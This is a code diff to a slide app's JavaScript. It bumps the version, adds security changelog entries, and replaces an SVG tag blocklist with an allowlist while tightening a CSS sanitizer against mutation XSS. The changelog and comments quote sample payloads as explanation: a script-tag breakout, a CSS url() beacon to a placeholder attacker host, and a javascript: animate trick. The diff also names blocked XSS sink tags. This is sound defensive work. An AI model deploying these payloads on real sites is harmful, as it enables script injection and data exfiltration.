@@ -69,9 +69,10 @@ const velaClipboardReadSlide = async () => {
   return null;
 };
 
-const VELA_VERSION = "12.54";
+const VELA_VERSION = "12.55";
 const VELA_CHANGELOG = [
-  { v: "12.54", d: "Security (Critical, audit 2026-06): fix script-context breakout in assemble.py. json.dumps(deck) was string-replaced into vela.jsx at the STARTUP_PATCH marker with no escape; the assembled .jsx is loaded inside <script type=\"text/babel\"> (app/local.html:392 and the Claude.ai artifact viewer), and HTML parsers close <script> on the literal </script token regardless of JS string quoting. A deck with `\"title\": \"</script><script>alert(1)</script>\"` therefore produced an out.jsx with the verbatim closing tag — full DOM/localStorage exfil and artifact-proxied API CSRF on render. The local-server pipeline (serve.py) had a one-line replace(\"</\", \"<\\\\/\") since the local-sync feature landed; assemble.py was the missing twin. Fix: extract escape_for_script_context() in assemble.py as the single source of truth, imported by serve.py. It escapes the full Django/Flask/Rails json_script set as \\uXXXX (valid JSON, valid JS): < (HTML </script breakout), > (symmetric), & (consistency), U+2028/2029 (terminate JS string literals on pre-ES2019 engines and some Babel-standalone paths). Replaces the prior <\\/-only blocklist in both call sites. CI regression test asserts the assembled STARTUP_PATCH region contains zero raw <,>,&,U+2028,U+2029 and all five escaped forms when the deck contains each char." },
+  { v: "12.55", d: "Security (Critical, audit 2026-06): fix script-context breakout in assemble.py. json.dumps(deck) was string-replaced into vela.jsx at the STARTUP_PATCH marker with no escape; the assembled .jsx is loaded inside <script type=\"text/babel\"> (app/local.html:392 and the Claude.ai artifact viewer), and HTML parsers close <script> on the literal </script token regardless of JS string quoting. A deck with `\"title\": \"</script><script>alert(1)</script>\"` therefore produced an out.jsx with the verbatim closing tag — full DOM/localStorage exfil and artifact-proxied API CSRF on render. The local-server pipeline (serve.py) had a one-line replace(\"</\", \"<\\\\/\") since the local-sync feature landed; assemble.py was the missing twin. Fix: extract escape_for_script_context() in assemble.py as the single source of truth, imported by serve.py. It escapes the full Django/Flask/Rails json_script set as \\uXXXX (valid JSON, valid JS): < (HTML </script breakout), > (symmetric), & (consistency), U+2028/2029 (terminate JS string literals on pre-ES2019 engines and some Babel-standalone paths). Replaces the prior <\\/-only blocklist in both call sites. CI regression test asserts the assembled STARTUP_PATCH region contains zero raw <,>,&,U+2028,U+2029 and all five escaped forms when the deck contains each char." },
+  { v: "12.54", d: "Security (audit 2026-06, High + structural): close mutation-XSS hole in sanitizeSvgMarkup() for `<style>` children AND switch from blocklist to allowlist for SVG elements. (1) Headline bug: the v12.45 fix dropped comment/CDATA/PI nodes during the walk, but the walk early-returned on `<style>` after the isSvgStyleSafe() check, so CDATA inside `<style>` was never inspected. CDATA content serializes literally via innerHTML; the embedded `</style>` then escapes rawtext on HTML re-parse by dangerouslySetInnerHTML, yielding a live `<img onerror>` from a deck-supplied svg block / studyNotes diagram / chat-panel SVG. Walk now descends into `<style>`; isSvgStyleSafe() also rejects any `<` or `]]>` as defense-in-depth. (2) Structural: replaced SVG_BLOCKED_TAGS with SVG_ALLOWED_TAGS, mirroring DOMPurify's `svg + svgFilters` profile minus script/foreignObject/use/animate*/iframe/embed/object/link. Anything not in the allowlist — including the entire HTML rawtext-on-serialize family (xmp/noembed/noscript/noframes/plaintext/listing) and any future surprise tag — is removed. Allowlists are inherently safer than blocklists (Cure53 / OWASP best practice). (3) New CI-gated jsdom round-trip test (tests/test_svg_mxss.cjs) runs the actual sanitizer against 25 mXSS payloads — replaces the previous source-string-only checks which gave false confidence because the line was present but unreached for `<style>`. jsdom added to package.json devDependencies; CI installs it before the unit step." },
   { v: "12.53", d: "Security (audit 2026-06, Low/defense-in-depth): close CSS-text exfil channel inside SVG. Before: <style> CSS text and <link rel=stylesheet> passed the element-only walk untouched, so `<style>* { background: url('https://attacker/?d=...') }</style>` (or @import) fired an outbound GET on render — zero-click beacon, no CSP backstop inside the artifact srcdoc. Not XSS (no script execution, sandboxed iframe), but still a confirmable render beacon and a slow CSS-attribute-exfil primitive. SAFE_STYLE_KEYS only covers `style=\"...\"` inline attributes. Fix: (1) <link> goes into SVG_BLOCKED_TAGS outright (no legitimate inline-SVG use). (2) <style> stays — Mermaid/draw.io/Vera-generated diagrams legitimately use inner CSS for class-driven styling and url(#fragment) paint-server/marker/gradient refs — but its textContent is filtered by isSvgStyleSafe(): reject @import, expression(), behavior:, -moz-binding, any backslash (CSS \XX escapes can decode 'url'/'@import' past a literal-token check), and any url() that isn't a same-document #fragment ref. Preserves legitimate class-based SVG styling; kills the exfil." },
   { v: "12.52", d: "Security (audit 2025-06 follow-up): (H7) Re-pin every GitHub Actions `uses:` to a 40-char commit SHA across all 7 workflows (actions/checkout, setup-python, setup-node, upload/download-artifact, github-script, attest-build-provenance, upload-pages-artifact, deploy-pages, pnpm/action-setup) — tag pins are mutable, and a publisher account compromise would let attackers re-point @vN at malicious code that runs in the privileged release pipeline (id-token: write + attestations: write). New CI regression test guards against future @vN tag pins. (Deps) Bump skills/vela-slides/channel @modelcontextprotocol/sdk ~1.27.1 → ^1.29.0, clearing 18 transitive CVEs (3 high, 14 moderate, 1 low) across path-to-regexp ReDoS, hono cookie-name validation / serveStatic bypass / CSS injection, fast-uri path-traversal & host-confusion, ip-address XSS, and qs DoS." },
   { v: "12.51", d: "Security (defense-in-depth, follow-up to v12.44/12.45): SVG href validation tightened from blocklist to allowlist after DOMParser normalization — only http/https/mailto/tel schemes (plus #fragment and scheme-less relatives) survive. Blocklist alone allowed file:, blob:, chrome:, intent:, ws: and other unexpected protocols through; only javascript:/data:/vbscript: were stripped. xlink:href remains restricted to local fragments. Mixed-case schemes (JaVaScRiPt:, JAVASCRIPT:) and entity-encoded schemes (already covered by the parser) now have explicit regression tests at both layers. Allowlisted schemes are covered by a regression guard so the tightening doesn't strip legitimate links." },
@@ -351,11 +352,41 @@ function openExternalLink(url) {
   if (safe) window.open(safe, "_blank", "noopener,noreferrer");
 }
 
-// SECURITY: <link> is a pure stylesheet loader with no legitimate inline-SVG
-// use, so it's blocked outright. <style> is kept (Mermaid, draw.io, Vera-
-// generated diagrams all rely on inner CSS for class-driven styling) but its
-// CSS text is filtered for zero-click exfil constructs — see isSvgStyleSafe.
-const SVG_BLOCKED_TAGS = new Set(["script", "foreignobject", "iframe", "embed", "object", "use", "animate", "animatetransform", "animatemotion", "animatecolor", "mpath", "set", "handler", "listener", "link"]);
+// SECURITY (v12.54): allowlist, not blocklist. Mirrors DOMPurify's SVG profile
+// (src/tags.ts `svg` + `svgFilters`) with Vela-specific exclusions for our
+// threat model (static presentation diagrams, no animation, no cross-doc
+// references). Anything not in this set — including the entire HTML rawtext
+// family (xmp/noembed/noscript/noframes/plaintext/listing) and any future
+// surprise tag — is removed during the walk. Excluded by design (commented
+// alongside each group): script/iframe/embed/object/link (XSS sinks),
+// foreignObject (re-enters HTML namespace, full HTML XSS surface), use (cross-
+// doc reference XSS — Cure53 #283 class), animate/animateColor/animateMotion/
+// animateTransform/set/mpath/discard/cursor (SMIL attr-mutation: `<animate
+// attributeName=href values=javascript:...>`), handler/listener (legacy
+// scripting hooks), font-face (FOUC + URL loaders).
+const SVG_ALLOWED_TAGS = new Set([
+  // structural
+  "svg", "g", "defs", "symbol", "switch", "view", "desc", "title", "metadata",
+  "marker", "mask", "clippath", "pattern", "filter",
+  // shapes
+  "circle", "ellipse", "line", "path", "polygon", "polyline", "rect",
+  // text/font (font/glyph/hkern/vkern + tref are deprecated but legitimate; no XSS surface)
+  "text", "tspan", "textpath", "tref", "altglyph", "altglyphdef", "altglyphitem",
+  "glyph", "glyphref", "font", "hkern", "vkern",
+  // gradients / paints
+  "lineargradient", "radialgradient", "stop",
+  // filter primitives (the `fe*` family — purely declarative pixel ops)
+  "feblend", "fecolormatrix", "fecomponenttransfer", "fecomposite",
+  "feconvolvematrix", "fediffuselighting", "fedisplacementmap", "fedistantlight",
+  "fedropshadow", "feflood", "fefunca", "fefuncb", "fefuncg", "fefuncr",
+  "fegaussianblur", "feimage", "femerge", "femergenode", "femorphology",
+  "feoffset", "fepointlight", "fespecularlighting", "fespotlight", "fetile",
+  "feturbulence",
+  // common-but-needs-care (each has explicit attribute filtering downstream)
+  "a",      // href passes scheme allowlist
+  "image",  // href/xlink:href pass scheme allowlist
+  "style",  // textContent passes isSvgStyleSafe; walk descends to strip CDATA/comment/PI
+]);
 
 // SVG <style> CSS-text filter. The threat: <style>* { background: url("https://
 // attacker/?d=...") }</style> or @import url(...) fires an outbound GET on
@@ -366,9 +397,13 @@ const SVG_BLOCKED_TAGS = new Set(["script", "foreignobject", "iframe", "embed", 
 // the network or use legacy code-execution constructs. CSS \XX escape
 // sequences can decode "url" / "@import" past a literal-token regex
 // (e.g. \75rl(…) → url(…)), so we conservatively reject any backslash.
+// Also reject any '<' or ']]>' — defense-in-depth against rawtext-breakout
+// payloads slipped through child node types (CDATA/comment/PI), see v12.52.
 function isSvgStyleSafe(css) {
   if (typeof css !== "string" || css.length > 5000) return false;
   if (css.indexOf("\\") !== -1) return false;
+  if (css.indexOf("<") !== -1) return false;
+  if (css.indexOf("]]>") !== -1) return false;
   if (/@import|expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
   const urls = css.match(/url\s*\([^)]*\)/gi);
   if (urls && urls.some((u) => !/^url\s*\(\s*['"]?\s*#/i.test(u))) return false;
@@ -391,10 +426,17 @@ function sanitizeSvgMarkup(raw) {
         if (child.nodeType !== 1 && child.nodeType !== 3) { child.remove(); continue; }
         if (child.nodeType === 1) {
           const tag = child.localName.toLowerCase();
-          if (SVG_BLOCKED_TAGS.has(tag)) { child.remove(); continue; }
+          // SECURITY (v12.54): allowlist — anything not explicitly known-safe is removed.
+          // Replaces the previous SVG_BLOCKED_TAGS blocklist (inherently incomplete).
+          if (!SVG_ALLOWED_TAGS.has(tag)) { child.remove(); continue; }
           if (tag === "style") {
             if (!isSvgStyleSafe(child.textContent || "")) { child.remove(); continue; }
-            // CSS text is safe — skip attribute walk (no on*/href/etc. on <style>) and don't descend.
+            // CSS text is safe — skip attribute walk (no on*/href/etc. on <style>).
+            // SECURITY (v12.52): we MUST still descend so the nodeType filter above
+            // strips any CDATA/comment/PI children. CDATA serializes literally and
+            // a smuggled `</style>` inside it escapes rawtext when re-parsed as HTML
+            // by dangerouslySetInnerHTML, yielding a live <img onerror=...>.
+            walk(child);
             continue;
           }
           const attrs = Array.from(child.attributes);
